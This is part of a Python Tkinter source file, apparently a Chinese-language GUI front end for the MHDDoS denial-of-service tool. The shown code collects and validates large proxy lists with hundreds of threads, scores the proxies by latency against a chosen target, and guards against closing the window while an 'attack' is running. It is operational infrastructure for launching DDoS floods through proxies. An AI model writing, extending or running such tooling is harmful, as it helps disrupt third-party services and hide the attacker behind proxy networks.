            args=(proxy_li, target.strip() if target else None, quality_threshold),
            daemon=True
        ).start()

    def _check_proxies_thread(self, proxy_li: Path, max_check: int = None):
        """检查代理线程（优化版：使用更快的验证方法）
        
        Args:
            proxy_li: 代理文件路径
            max_check: 最大检查数量，None表示检查所有代理
        """
        try:
            from start import ProxyUtiles, ProxyChecker
            from concurrent.futures import ThreadPoolExecutor, as_completed
            from socket import AF_INET, SOCK_STREAM
            import time as time_module

            # 备份原文件（在检查前备份）
            backup_file = proxy_li.parent / f"{proxy_li.stem}_original{proxy_li.suffix}"
            if proxy_li.exists() and not backup_file.exists():
                try:
                    import shutil
                    shutil.copy2(proxy_li, backup_file)
                    self.root.after(0, lambda: self.log(f"已备份原代理文件", "DEBUG"))
                except Exception:
                    pass
            
            proxies = ProxyUtiles.readFromFile(proxy_li)
            proxy_count = len(proxies)
            
            if proxy_count == 0:
                self.root.after(0, lambda: self.log("代理文件为空", "WARNING"))
                return

            # 根据用户选择或代理数量决定检查数量
            if max_check is None:
                # 用户选择检查所有，但根据数量自动调整参数
                if proxy_count > 50000:
                    # 如果数量太多，建议只检查前20000个
                    self.root.after(0, lambda: self.log(
                        f"代理数量较多 ({proxy_count:,} 个)，建议只检查前 20000 个以提高速度", "WARNING"
                    ))
                    self.root.after(0, lambda: self.log("继续检查所有代理...", "INFO"))
                    proxies_list = list(proxies)
                    check_count = proxy_count
                else:
                    proxies_list = list(proxies)
                    check_count = proxy_count
            else:
                # 用户指定了检查数量
                check_count = min(max_check, proxy_count)
                proxies_list = list(proxies)[:check_count]
                if check_count < proxy_count:
                    self.root.after(0, lambda c=check_count, t=proxy_count: self.log(
                        f"将检查前 {c:,} 个代理（共 {t:,} 个）", "INFO"
                    ))
            
            self.root.after(0, lambda c=check_count: self.log(f"加载了 {c:,} 个代理，开始快速检查...", "INFO"))

            # 优化：使用更快的验证方法
            # 1. 使用更短的超时时间（2秒）
            # 2. 使用更快的验证URL（直接IP检查）
            # 3. 增加线程数以提高并发
            
            # 根据检查数量调整验证参数
            if check_count > 50000:
                check_threads = 300  # 增加线程数
                timeout_sec = 3  # 缩短超时
            elif check_count > 10000:
                check_threads = 250  # 增加线程数
                timeout_sec = 2  # 缩短超时
            else:
                check_threads = 200  # 增加线程数
                timeout_sec = 2  # 缩短超时
            
            self.root.after(0, lambda c=check_count, t=check_threads, to=timeout_sec: self.log(
                f"开始快速验证 {c:,} 个代理（线程数: {t}, 超时: {to}秒）...", "INFO"
            ))
            
            # 优化：使用更快的验证URL（优先使用响应快的服务）
            # 使用直接IP检查服务，避免HTTP请求开销
            test_urls = [
                "http://icanhazip.com",  # 最快，响应简单
                "http://api.ipify.org",  # 快速，只返回IP
                "http://httpbin.org/get",  # 备用
                "https://api.ipify.org",  # HTTPS备用
            ]
            
            checked_proxies = set()
            start_time = time_module.time()
            
            # 优化：使用最快的验证URL，如果成功就停止
            for test_url in test_urls:
                try:
                    url_val = test_url
                    self.root.after(0, lambda u=url_val: self.log(f"使用验证URL: {u}", "DEBUG"))
                    checked = ProxyChecker.checkAll(
                        proxies_list, timeout=timeout_sec, threads=check_threads,
                        url=test_url
                    )
                    if checked:
                        checked_proxies.update(checked)
                        checked_count = len(checked)
                        elapsed = time_module.time() - start_time
                        url_val2 = test_url
                        self.root.after(0, lambda u=url_val2, c=checked_count, e=elapsed: self.log(
                            f"✓ 验证成功: {u}，找到 {c:,} 个可用代理（耗时 {e:.1f}秒）", "INFO"
                        ))
                        break
                except Exception as e:
                    url_val3 = test_url
                    err_msg = str(e)
                    self.root.after(0, lambda u=url_val3, err=err_msg: self.log(f"验证URL {u} 失败: {err}，尝试下一个...", "WARNING"))
                    continue
            
            # 如果所有URL都失败，使用默认URL再试一次
            if not checked_proxies:
                self.root.after(0, lambda: self.log("所有验证URL都失败，使用默认URL重试...", "WARNING"))
                try:
                    checked_proxies = ProxyChecker.checkAll(
                        proxies_list, timeout=timeout_sec, threads=check_threads,
                        url="http://icanhazip.com"  # 使用最快的默认URL
                    )
                except Exception as e:
                    err_msg = str(e)
                    self.root.after(0, lambda msg=err_msg: self.log(f"默认验证也失败: {msg}", "ERROR"))
                    checked_proxies = set()

            # 保存检查结果
            total_time = time_module.time() - start_time
            
            # 保存检查后的代理（只保存可用的）
            with proxy_li.open("w", encoding="utf-8") as f:
                for proxy in checked_proxies:
                    f.write(str(proxy) + "\n")

            self.root.after(0, lambda c=len(checked_proxies), t=total_time: self.log(
                f"✓ 代理检查完成: {c:,} 个可用代理（总耗时 {t:.1f}秒）", "INFO"
            ))
            
            # 更新代理列表，显示检查状态
            self.root.after(0, self._update_proxy_list_with_status)

        except Exception as e:
            err_msg = str(e)
            self.root.after(0, lambda msg=err_msg: self.log(f"检查代理错误: {msg}", "ERROR"))
    
    def _advanced_check_proxies_thread(self, proxy_li: Path, target: str = None, quality_threshold: int = 0):
        """高级代理质量检查线程（多指标验证）"""
        try:
            from start import ProxyUtiles, ProxyChecker
            from socket import AF_INET, SOCK_STREAM, gethostbyname
            import time as time_module
            from concurrent.futures import ThreadPoolExecutor, as_completed
            
            proxies = ProxyUtiles.readFromFile(proxy_li)
            proxy_count = len(proxies)
            self.root.after(0, lambda: self.log(f"加载了 {proxy_count:,} 个代理，开始高级质量检查...", "INFO"))
            
            if proxy_count == 0:
                self.root.after(0, lambda: self.log("代理文件为空", "WARNING"))
                return
            
            # 限制检查数量（高级检查更耗时）
            max_check = min(proxy_count, 5000)  # 最多检查5000个
            if proxy_count > max_check:
                self.root.after(0, lambda: self.log(f"代理数量较多，将检查前 {max_check:,} 个代理", "INFO"))
            
            proxies_list = list(proxies)[:max_check]
            
            # 确定验证目标
            if target and ":" in target:
                try:
                    target_host, target_port_str = target.rsplit(":", 1)
                    target_port = int(target_port_str)
                    try:
                        target_ip = gethostbyname(target_host)
                        test_target = (target_ip, target_port)
                        self.root.after(0, lambda: self.log(f"使用目标特定验证: {target_host}:{target_port}", "INFO"))
                    except:
                        test_target = None
                        self.root.after(0, lambda: self.log(f"无法解析目标地址，使用通用验证", "WARNING"))
                except:
                    test_target = None
            else:
                test_target = None
            
            # 备份原文件
            backup_file = proxy_li.parent / f"{proxy_li.stem}_original{proxy_li.suffix}"
            if proxy_li.exists() and not backup_file.exists():
                try:
                    import shutil
                    shutil.copy2(proxy_li, backup_file)
                except:
                    pass
            
            # 多指标验证
            self.root.after(0, lambda: self.log("开始多指标质量检查（速度、延迟、稳定性）...", "INFO"))
            
            quality_proxies = []
            checked_count = 0
            
            def _test_proxy_quality(proxy):
                """测试单个代理的质量"""
                try:
                    # 测试1: 连接速度（建立连接的时间）
                    start_time = time_module.time()
                    try:
                        if test_target:
                            # 目标特定验证
                            test_sock = proxy.open_socket(AF_INET, SOCK_STREAM)
                            test_sock.settimeout(5)
                            test_sock.connect(test_target)
                            test_sock.close()
                        else:
                            # 通用验证（使用ProxyChecker）
                            from start import ProxyChecker
                            test_result = ProxyChecker.checkAll(
                                {proxy}, timeout=5, threads=1,
                                url="http://icanhazip.com"
                            )
                            if not test_result:
                                return None
                        
                        connect_time = (time_module.time() - start_time) * 1000  # 转换为毫秒
                        
                        # 测试2: 延迟（ping测试）
                        latency = connect_time  # 使用连接时间作为延迟估算
                        
                        # 计算质量分数
                        # 延迟分数（0-40分）：延迟越低分数越高
                        if latency < 100:
                            latency_score = 40
                        elif latency < 300:
                            latency_score = 30
                        elif latency < 500:
                            latency_score = 20
                        elif latency < 1000:
                            latency_score = 10
                        else:
                            latency_score = 0
                        
                        # 速度分数（0-30分）：连接时间越短分数越高
                        if connect_time < 200:
                            speed_score = 30
                        elif connect_time < 500:
                            speed_score = 20
                        elif connect_time < 1000:
                            speed_score = 10
                        else:
                            speed_score = 0
                        
                        # 稳定性分数（0-30分）：基于是否能成功连接
                        stability_score = 30  # 如果能连接，给满分
                        
                        total_score = latency_score + speed_score + stability_score
                        
                        return {
                            "proxy": proxy,
                            "score": total_score,
                            "latency": latency,
                            "connect_time": connect_time,
                            "latency_score": latency_score,
                            "speed_score": speed_score,
                            "stability_score": stability_score
                        }
                    except Exception:
                        return None
                except Exception:
                    return None
            
            # 并发测试代理质量
            check_threads = min(100, len(proxies_list))
            self.root.after(0, lambda: self.log(f"使用 {check_threads} 个线程进行质量检查...", "INFO"))
            
            with ThreadPoolExecutor(max_workers=check_threads) as executor:
                futures = {executor.submit(_test_proxy_quality, p): p for p in proxies_list}
                
                for future in as_completed(futures):
                    checked_count += 1
                    result = future.result()
                    if result and result["score"] >= quality_threshold:
                        quality_proxies.append(result)
                    
                    # 每检查100个代理更新一次进度
                    if checked_count % 100 == 0:
                        self.root.after(0, lambda c=checked_count, t=len(proxies_list), q=len(quality_proxies): self.log(
                            f"检查进度: {c}/{t}，找到 {q} 个高质量代理", "INFO"
                        ))
            
            # 按质量分数排序
            quality_proxies.sort(key=lambda x: x["score"], reverse=True)
            
            # 保存高质量代理
            with proxy_li.open("w", encoding="utf-8") as f:
                for item in quality_proxies:
                    f.write(str(item["proxy"]) + "\n")
            
            # 显示统计信息
            if quality_proxies:
                avg_score = sum(item["score"] for item in quality_proxies) / len(quality_proxies)
                avg_latency = sum(item["latency"] for item in quality_proxies) / len(quality_proxies)
                best_score = quality_proxies[0]["score"]
                worst_score = quality_proxies[-1]["score"]
                
                self.root.after(0, lambda: self.log(
                    f"✓ 高级检查完成: {len(quality_proxies):,} 个高质量代理", "INFO"
                ))
                self.root.after(0, lambda: self.log(
                    f"质量统计: 平均分数 {avg_score:.1f}/100, 平均延迟 {avg_latency:.0f}ms", "INFO"
                ))
                self.root.after(0, lambda: self.log(
                    f"分数范围: {worst_score} - {best_score}", "INFO"
                ))
            else:
                self.root.after(0, lambda: self.log(
                    f"⚠️ 未找到满足质量要求的代理（阈值: {quality_threshold}）", "WARNING"
                ))
                self.root.after(0, lambda: self.log(
                    "建议: 降低质量阈值或重新下载代理", "WARNING"
                ))
            
            # 更新代理列表
            self.root.after(0, self._update_proxy_list_with_status)
            
        except Exception as e:
            err_msg = str(e)
            self.root.after(0, lambda msg=err_msg: self.log(f"高级检查错误: {msg}", "ERROR"))

    def refresh_proxy_list(self):
        """刷新代理列表"""
        self._update_proxy_list_with_status()

    def _update_proxy_list_with_status(self):
        """更新代理列表（带检查状态）"""
        proxy_file = self.proxy_manage_file_var.get()
        proxy_li = __dir__ / "files" / "proxies" / proxy_file

        # 清空列表
        for item in self.proxy_tree.get_children():
            self.proxy_tree.delete(item)

        if not proxy_li.exists():
            self.proxy_count_label.config(text="代理总数: 0 (文件不存在)")
            return

        try:
            from start import ProxyUtiles

            proxies = ProxyUtiles.readFromFile(proxy_li)
            
            # 检查是否有已检查的代理文件（检查后会保存可用代理）
            # 如果文件存在且有内容，说明已经检查过
            checked_count = len(proxies) if proxies else 0
            
            # 尝试读取原始代理文件以获取总数（如果存在备份）
            original_file = proxy_li.parent / f"{proxy_li.stem}_original{proxy_li.suffix}"
            total_count = checked_count
            if original_file.exists():
                try:
                    original_proxies = ProxyUtiles.readFromFile(original_file)
                    total_count = len(original_proxies) if original_proxies else checked_count
                except:
                    pass

            for i, proxy in enumerate(proxies, 1):
                proxy_str = str(proxy)
                proxy_type = proxy.type.name if hasattr(proxy.type, 'name') else "Unknown"
                # 如果代理在列表中，说明已检查且可用
                status = "✓ 可用" if proxies else "未检查"
                self.proxy_tree.insert("", tk.END, values=(
                    i, proxy_str, proxy_type, status
                ))

            # 更新计数标签（显示已检查和总数）
            if total_count > checked_count:
                self.proxy_count_label.config(text=f"代理总数: {total_count:,} (已检查: {checked_count:,} 可用)")
            else:
                self.proxy_count_label.config(text=f"代理总数: {checked_count:,}")

        except Exception as e:
            self.log(f"刷新代理列表错误: {e}", "ERROR")

    def _filter_proxy_list(self):
        """筛选代理列表"""
        filter_text = self.proxy_filter_var.get().lower().strip()
        
        if not filter_text:
            # 如果没有筛选条件，显示所有
            for item in self.proxy_tree.get_children():
                self.proxy_tree.item(item, tags=())
            return
        
        # 筛选逻辑
        for item in self.proxy_tree.get_children():
            values = self.proxy_tree.item(item, "values")
            if len(values) >= 3:
                proxy_str = str(values[1]).lower()
                proxy_type = str(values[2]).lower()
                status = str(values[3]).lower() if len(values) > 3 else ""
                
                # 检查是否匹配筛选条件
                match = (
                    filter_text in proxy_str or
                    filter_text in proxy_type or
                    filter_text in status
                )
                
                if match:
                    self.proxy_tree.item(item, tags=())
                else:
                    self.proxy_tree.item(item, tags=("hidden",))
        
        # 隐藏不匹配的项目
        self.proxy_tree.tag_configure("hidden", display="none")
    
    def _clear_proxy_filter(self):
        """清除筛选条件"""
        self.proxy_filter_var.set("")
        self._filter_proxy_list()
    
    def clear_proxy_list(self):
        """清空代理列表"""
        if messagebox.askyesno("确认", "确定要清空代理列表吗？"):
            proxy_file = self.proxy_manage_file_var.get()
            proxy_li = __dir__ / "files" / "proxies" / proxy_file

            if proxy_li.exists():
                try:
                    proxy_li.unlink()
                    self.refresh_proxy_list()
                    self.log("代理列表已清空")
                except Exception as e:
                    self.log(f"清空代理列表错误: {e}", "ERROR")

    def clear_log(self):
        """清空日志"""
        self.log_text.config(state=tk.NORMAL)
        self.log_text.delete(1.0, tk.END)
        self.log_text.config(state=tk.DISABLED)

    def save_log(self):
        """保存日志"""
        filename = filedialog.asksaveasfilename(
            title="保存日志",
            defaultextension=".txt",
            filetypes=[("文本文件", "*.txt"), ("所有文件", "*.*")]
        )
        if filename:
            try:
                with open(filename, "w", encoding="utf-8") as f:
                    f.write(self.log_text.get(1.0, tk.END))
                self.log(f"日志已保存到: {filename}")
            except Exception as e:
                messagebox.showerror("错误", f"保存日志失败: {e}")

    def load_config(self):
        """加载配置"""
        self.log("GUI工具已启动", "INFO")
        self.refresh_proxy_list()


def main():
    """主函数"""
    root = tk.Tk()
    app = MHDDoSGUI(root)

    # 设置窗口关闭事件
    def on_closing():
        if app.is_attacking:
            if messagebox.askyesno("确认", "攻击正在进行中，确定要退出吗？"):
                app.stop_attack()
                root.after(500, root.destroy)
        else:
            root.destroy()

    root.protocol("WM_DELETE_WINDOW", on_closing)
    root.mainloop()


if __name__ == "__main__":
    main()

